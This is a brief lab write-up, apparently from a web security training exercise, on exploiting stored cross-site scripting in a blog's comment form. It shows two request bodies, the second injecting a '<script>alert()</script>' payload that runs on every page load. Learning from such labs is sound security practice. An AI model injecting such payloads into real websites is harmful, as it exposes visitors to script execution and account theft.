# Stored XSS into HTML context with nothing encoded

## This lab contains a [stored cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the comment functionality.

## To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

### step1

`csrf=EmoyMhbu9LaNFmVBLnBV4Si0ATCL6Fz3&postId=1&comment=<p>hello</p>&name=hello&email=tes%40gmail.com&website=`

send request 302 Found

### step2

`csrf=EmoyMhbu9LaNFmVBLnBV4Si0ATCL6Fz3&postId=1&comment=<script>alert()</script>&name=<p>hello</p>&email=tes%40gmail.com&website=`

send request 302 Found
now reload page alert pop will com on each reload
